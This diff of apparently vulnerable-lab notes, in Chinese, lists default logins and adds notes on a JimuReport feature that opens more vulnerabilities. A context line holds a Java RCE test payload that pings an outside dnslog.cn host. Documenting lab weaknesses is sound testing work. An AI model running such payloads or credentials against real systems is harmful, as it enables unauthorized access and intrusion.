@@ -3,7 +3,7 @@ admin admin123
 test test123
 hrmgr hr123
 
-
+测试用户可以在角色用户设置哪里直接设置权限。
 ```
 test123
 bv1BUHrzxj5rXjwSBhwqrfoa8RgrUBK8bldbPKY62k6hkKN0zeOcz0Sztlto66M1G/c2Tz7qWWOHBtMQTdHBPQ==
@@ -104,5 +104,8 @@ java.lang.Runtime.getRuntime().exec("ping hng2al.dnslog.cn");
 
 ^
 ## **jdbc**
-DataGear全版本RCE
 
+
+^
+## **积木报表**
+手动开启积木报表功能，开启了更多漏洞。
